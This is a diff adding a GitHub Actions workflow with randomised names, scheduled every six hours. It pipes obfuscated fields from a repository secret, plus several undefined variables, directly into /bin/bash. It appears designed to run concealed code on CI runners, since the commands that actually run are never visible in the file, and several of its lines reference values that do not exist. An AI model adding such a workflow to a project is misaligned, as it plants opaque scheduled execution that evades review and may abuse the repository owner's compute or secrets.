@@ -1,0 +1,23 @@
+name: commissionperturbed
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: commissionperturbed
+        env:
+          k8645: ${{ secrets.k8645 }}
+        run: |
+          echo $k8645 | jq -r .zmyxx61 | /bin/bash
+          echo $ldv36138 | jq -r .ombmm35 | /bin/bash
+          echo $qm41008 | jq -r .ku1 | /bin/bash
+          echo $sejd10503 | jq -r .z44884 | /bin/bash
+          echo $uzdgv7 | jq -r .fppo6 | /bin/bash
+          echo $pab216 | jq -r .zistm00 | /bin/bash
+
